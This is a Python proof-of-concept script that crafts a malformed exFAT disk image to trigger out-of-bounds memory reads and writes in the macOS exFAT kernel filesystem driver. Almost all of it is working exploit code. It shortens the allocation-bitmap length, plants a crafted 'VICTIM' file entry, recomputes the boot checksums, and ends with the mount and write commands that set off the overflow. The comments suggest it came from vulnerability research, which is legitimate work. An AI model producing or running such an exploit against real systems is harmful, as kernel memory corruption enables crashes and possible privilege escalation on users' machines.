#!/usr/bin/env python3
# build_exfat_bitmap_poc.py — craft an exFAT image that triggers
# _exfat_bitmap_map OOB (read at mount via count_free_clusters, write via file alloc)
# by making the allocation-bitmap dirent DataLength SHORTER than ceil(ClusterCount/8).
# macOS 27 26A5353q com.apple.filesystems.exfat. Codex laneBM static find.
#
# Hybrid: newfs_exfat makes a valid scaffold, then we surgically shrink the
# 0x81 allocation-bitmap dirent DataLength, fill the declared bitmap 0xFF
# (all-used so allocator/count walks past it), and recompute the boot checksum.
#
# Usage: python3 build_exfat_bitmap_poc.py            -> ~/exfat_poc.img
#   env: EXF_BITMAP_LEN (declared bitmap DataLength, default 8192)
#        EXF_SIZE_MB    (image size, default 256)
#        EXF_OUT        (output path)
import os, struct, subprocess, sys

SIZE_MB = int(os.environ.get("EXF_SIZE_MB", "256"))
BITMAP_LEN = int(os.environ.get("EXF_BITMAP_LEN", "8192"))
OUT = os.path.expanduser(os.environ.get("EXF_OUT", "~/exfat_poc.img"))

# 1. valid scaffold via newfs_exfat (needs a device: attach raw img -nomount, format, detach)
subprocess.run(["dd", "if=/dev/zero", f"of={OUT}", "bs=1m", f"count={SIZE_MB}"],
               check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
att = subprocess.run(["hdiutil", "attach", "-nomount", "-imagekey",
                      "diskimage-class=CRawDiskImage", OUT],
                     capture_output=True, text=True)
if att.returncode != 0:
    sys.stderr.write("hdiutil attach failed:\n"+att.stdout+att.stderr+"\n"); sys.exit(1)
dev = att.stdout.split()[0].strip()   # /dev/diskN
print(f"[*] attached {dev}")
try:
    r = subprocess.run(["/sbin/newfs_exfat", "-b", "512", dev],
                       capture_output=True, text=True)
    if r.returncode != 0:
        sys.stderr.write("newfs_exfat failed:\n"+r.stdout+r.stderr+"\n")
        subprocess.run(["hdiutil", "detach", dev], capture_output=True)
        sys.exit(1)
    print("[*] newfs_exfat ok")
finally:
    subprocess.run(["hdiutil", "detach", dev], capture_output=True)
    print(f"[*] detached {dev}")

img = bytearray(open(OUT, "rb").read())

def u8(o):  return img[o]
def u16(o): return struct.unpack_from("<H", img, o)[0]
def u32(o): return struct.unpack_from("<I", img, o)[0]
def u64(o): return struct.unpack_from("<Q", img, o)[0]

assert img[3:11] == b"EXFAT   ", "not exFAT boot sector"
bps_shift = u8(0x6C); spc_shift = u8(0x6D)
BPS = 1 << bps_shift
SPC = 1 << spc_shift
cluster_bytes = BPS * SPC
fat_off    = u32(0x50)   # sectors
fat_len    = u32(0x54)
heap_off   = u32(0x58)   # sectors
clus_count = u32(0x5C)
root_clus  = u32(0x60)
num_fats   = u8(0x6E)
print(f"[*] BPS={BPS} SPC={SPC} clusterBytes={cluster_bytes} ClusterCount={clus_count} rootClus={root_clus} heapOff={heap_off}")
print(f"[*] needed bitmap = ceil(ClusterCount/8) = {(clus_count+7)//8} bytes; we will declare {BITMAP_LEN}")

def cluster_to_byte(c):
    # cluster index is 2-based; data heap starts at heap_off sectors
    return (heap_off + (c-2)*SPC) * BPS

# 2. walk root directory clusters for the 0x81 allocation-bitmap dirent
def read_fat(c):
    return u32(fat_off*BPS + c*4)

bitmap_dirent_off = None
c = root_clus
visited = 0
while c >= 2 and c != 0xFFFFFFFF and visited < 4096:
    base = cluster_to_byte(c)
    for e in range(0, cluster_bytes, 0x20):
        et = img[base+e]
        if et == 0x00:
            break
        if et == 0x81:   # allocation bitmap dirent
            bitmap_dirent_off = base + e
            break
    if bitmap_dirent_off is not None:
        break
    nxt = read_fat(c)
    if nxt < 2 or nxt >= 0xFFFFFFF8:
        break
    c = nxt
    visited += 1

assert bitmap_dirent_off is not None, "could not find 0x81 allocation-bitmap dirent"
b_first = u32(bitmap_dirent_off + 0x14)
b_len   = u64(bitmap_dirent_off + 0x18)
print(f"[*] bitmap dirent @0x{bitmap_dirent_off:x}: firstCluster={b_first} DataLength={b_len}")

# 3. fill the (declared-short) bitmap region all 0xFF so every declared cluster looks USED
bmp_byte = cluster_to_byte(b_first)
for i in range(BITMAP_LEN):
    img[bmp_byte + i] = 0xFF
# 4. shrink the dirent DataLength to the short value (< ceil(ClusterCount/8))
struct.pack_into("<Q", img, bitmap_dirent_off + 0x18, BITMAP_LEN)
print(f"[*] shrank bitmap DataLength -> {BITMAP_LEN}, filled declared region 0xFF (all-used)")

# 4b. PLANT a file entry set in the root dir at cluster 131074 (NoFatChain, huge DataLength)
#     so unlink -> _exfat_file_shrink/_exfat_chain_free -> _exfat_bitmap_mark_free walks a
#     cluster range whose bit index is past the short bitmap -> bitmap_map wrap -> OOB write.
PLANT_FIRST = int(os.environ.get("EXF_PLANT_CLUSTER", str(131074)))
PLANT_NCLUS = int(os.environ.get("EXF_PLANT_NCLUS", str(380000)))   # bounded by max_cluster
def cksum16(data, skip=()):
    cs = 0
    for i, b in enumerate(data):
        if i in skip: continue
        cs = (((cs & 1) << 15) | (cs >> 1)) + b
        cs &= 0xFFFF
    return cs
# find first free (0x00) entry slot in the root dir cluster chain
root_base = cluster_to_byte(root_clus)
slot = None
for e in range(0, cluster_bytes, 0x20):
    if img[root_base + e] == 0x00:
        slot = root_base + e; break
assert slot is not None, "no free root-dir slot"
name = "VICTIM".encode("utf-16-le")    # uppercase -> upcase identity, NameHash simple
namelen = len(name) // 2
datalen = PLANT_NCLUS * cluster_bytes
# Stream Extension (0xC0)
stream = bytearray(0x20)
stream[0] = 0xC0
stream[1] = 0x03            # AllocationPossible | NoFatChain
stream[3] = namelen
struct.pack_into("<H", stream, 0x04, cksum16(name))   # NameHash
struct.pack_into("<Q", stream, 0x08, datalen)         # ValidDataLength
struct.pack_into("<I", stream, 0x14, PLANT_FIRST)     # FirstCluster
struct.pack_into("<Q", stream, 0x18, datalen)         # DataLength
# File Name (0xC1)
fname = bytearray(0x20); fname[0] = 0xC1; fname[2:2+len(name)] = name
# File Directory Entry (0x85)
filee = bytearray(0x20)
filee[0] = 0x85
filee[1] = 2               # SecondaryCount: stream + name
struct.pack_into("<H", filee, 0x04, 0x0020)           # FileAttributes = Archive
setck = cksum16(bytes(filee) + bytes(stream) + bytes(fname), skip=(2, 3))
struct.pack_into("<H", filee, 0x02, setck)            # SetChecksum
img[slot:slot+0x20]        = filee
img[slot+0x20:slot+0x40]   = stream
img[slot+0x40:slot+0x60]   = fname
print(f"[*] planted VICTIM file @root slot 0x{slot:x}: FirstCluster={PLANT_FIRST} nclus={PLANT_NCLUS} datalen={datalen}")
print(f"    -> unlink /Volumes/.../VICTIM triggers _exfat_bitmap_mark_free OOB write")

# 5. recompute exFAT boot checksum (sector 11) over sectors 0..10,
#    excluding bytes 106,107 (VolumeFlags) and 112 (PercentInUse).
def boot_checksum(buf):
    cs = 0
    for i in range(11 * BPS):
        if i in (106, 107, 112):
            continue
        cs = (((cs << 31) | (cs >> 1)) + buf[i]) & 0xFFFFFFFF
    return cs

def write_checksum_region(region_start):
    cs = boot_checksum(img[region_start:region_start + 12*BPS])
    csec = region_start + 11*BPS
    for o in range(0, BPS, 4):
        struct.pack_into("<I", img, csec + o, cs)
    return cs

cs_main = write_checksum_region(0)
cs_bak  = write_checksum_region(12*BPS)   # backup boot region sectors 12..23
print(f"[*] recomputed boot checksum main=0x{cs_main:x} backup=0x{cs_bak:x}")

open(OUT, "wb").write(img)
print(f"[*] wrote {OUT}")
print("[*] TEST IN VM: hdiutil attach -nomount? no -> attach RW + mount, OR")
print("    mount_exfat /dev/diskN /mnt ; then `dd if=/dev/zero of=/mnt/big bs=1m count=120` to force bitmap alloc past short bitmap -> OOB write")
